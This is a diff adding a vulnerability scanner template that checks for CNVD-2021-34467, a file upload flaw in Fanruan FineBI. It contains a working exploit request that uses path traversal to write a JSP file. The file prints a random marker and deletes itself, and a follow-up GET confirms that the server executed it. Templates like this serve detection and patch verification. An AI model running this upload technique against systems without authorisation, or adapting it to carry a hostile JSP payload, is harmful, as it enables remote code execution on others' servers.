@@ -1,0 +1,42 @@
+id: cnvd-2021-34467
+info:
+  name: Fanruan FineBI File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Fanruan FineBI contains a file upload vulnerability allowing attackers to upload malicious files and execute arbitrary code on the server.
+    This vulnerability is identified as CNVD-2021-34467.
+  reference:
+    - https://vul.wangan.com/a/CNVD-2021-34467
+
+variables:
+  rand: '{{md5(rand_text_alpha(20))}}'
+  rFilename: '{{rand_text_alpha(6)}}'
+
+http:
+  - id: file-upload
+    method: POST
+    path:
+      - '{{BaseURL}}/WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/{{rFilename}}.svg.jsp'
+    headers:
+      Content-Type: text/xml;charset=UTF-8
+    body: |
+      {"__CONTENT__":"<%out.println(\"{{rand}}\");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>","__CHARSET__":"UTF-8"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: file-verification
+    method: GET
+    path:
+      - '{{BaseURL}}/WebReport/{{rFilename}}.svg.jsp'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '{{rand}}'
